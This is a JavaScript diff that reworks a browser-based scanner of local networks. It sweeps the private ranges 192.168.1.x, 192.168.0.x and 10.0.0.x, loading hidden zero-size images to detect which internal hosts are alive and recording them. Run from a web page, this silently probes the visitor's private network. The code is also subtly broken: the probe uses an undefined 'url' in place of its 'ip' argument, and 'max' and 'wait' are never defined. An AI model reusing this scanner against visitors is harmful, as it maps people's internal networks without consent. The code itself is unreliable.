@@ -1,21 +1,25 @@
+ClassC(["192.168.1.", "192.168.0.", "10.0.0."], Checker);
 
-ClassC(["192.168.1.", "192.168.0.", "10.0.0."], addData);
+async function Checker(ip) {
+    isAlive = await Performance(ip);
+    if (isAlive) addData(ip);
+}
 
-async function Performance(ip){
-  var img = new Image(0,0);
-  img.hidden = true;
-  img.src = "http://"+url;
-  document.body.appendChild(img); 
-  await wait(max);
-  let data = img.complete;
-  img.remove();
-  return data;
+async function Performance(ip) {
+    var img = new Image(0, 0);
+    img.hidden = true;
+    img.src = "http://" + url;
+    document.body.appendChild(img);
+    await wait(max);
+    let data = img.complete;
+    img.remove();
+    return data;
 }
 
 async function ClassC(array, callback) {
     array.forEach(prefix => {
         for (var i = 1; i <= 255; i++) {
-            callback(start + i)
+            callback(prefix + i)
         }
     })
 }
